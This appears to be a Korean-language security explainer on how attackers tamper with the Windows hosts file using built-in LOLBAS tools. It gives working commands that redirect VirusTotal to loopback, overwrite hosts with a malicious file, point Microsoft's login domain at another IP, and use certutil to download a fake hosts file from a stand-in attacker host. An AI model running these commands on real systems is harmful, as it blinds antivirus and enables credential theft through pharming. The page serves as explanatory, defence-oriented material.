### 🎯 왜 `hosts` 파일을 수정할까요?

공격자가 관리자 권한을 탈취한 후 `hosts` 파일을 변조하는 주된 목적은 다음과 같습니다.

* **보안 방어망 무력화:** `virustotal.com`, 안랩, 마이크로소프트 업데이트 서버 등의 도메인을 `127.0.0.1`(로컬호스트)로 연결되게 만들어, 감염된 PC가 백신을 업데이트하거나 보안 사이트에 접속하지 못하게 눈과 귀를 가립니다.
* **피싱 및 파밍(DNS 스푸핑):** 사용자가 브라우저에 정상적인 은행 웹사이트나 포털 주소를 입력해도, 공격자가 미리 설정해둔 가짜(피싱) 서버 IP로 몰래 우회 접속되도록 유도하여 계정 정보를 탈취합니다.

---

### 🛠️ `hosts` 파일 변조에 자주 악용되는 LOLBAS 도구들

대표적으로 다음과 같은 내장 도구들이 활용됩니다.

#### 1. CMD (`echo`, `type`, `copy`)
가장 단순하고 고전적이지만 여전히 강력한 방식입니다. `cmd.exe`를 통해 명령어 한 줄로 파일 끝에 악성 라인을 추가하거나, 미리 만들어둔 파일로 통째로 덮어씁니다.

```cmd
:: 특정 도메인 접속 차단 (루프백 주소로 리다이렉트)
echo 127.0.0.1 www.virustotal.com >> C:\Windows\System32\drivers\etc\hosts

:: 미리 만들어둔 악성 hosts 파일로 기존 파일 덮어쓰기
copy /Y C:\temp\malicious_hosts.txt C:\Windows\System32\drivers\etc\hosts
```

#### 2. PowerShell (`Add-Content`, `Out-File`)
파워쉘은 시스템 관리에 최적화되어 있어 파일 제어가 매우 쉽습니다. EDR의 문자열 탐지를 피하기 위해 Base64로 인코딩된 텍스트를 메모리 상에서 푼 뒤 `hosts` 파일에 삽입하는 등 더 난독화된 형태로 자주 쓰입니다.

```powershell
Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Value "192.168.1.100 login.microsoftonline.com"
```

#### 3. Certutil (`certutil.exe`)
본래 윈도우의 정상적인 인증서 관리 도구지만, 외부에서 파일을 다운로드하거나 Base64를 디코딩하는 기능이 있어 전형적인 LOLBin으로 악용됩니다. 외부 C&C 서버에서 조작된 `hosts` 파일을 직접 다운로드하여 덮어쓰는 식입니다.

```cmd
certutil.exe -urlcache -split -f "http://malicious-site.com/fake_hosts.txt" C:\Windows\System32\drivers\etc\hosts
```

#### 4. WScript / CScript (VBScript, JScript)
윈도우 스크립트 호스트를 통해 `Scripting.FileSystemObject` 객체를 호출하여 백그라운드에서 조용히 `hosts` 파일을 열고 내용을 수정합니다. 매크로 바이너리나 악성 스크립트 파일(`.vbs`, `.js`) 내부에서 주로 실행됩니다.

---
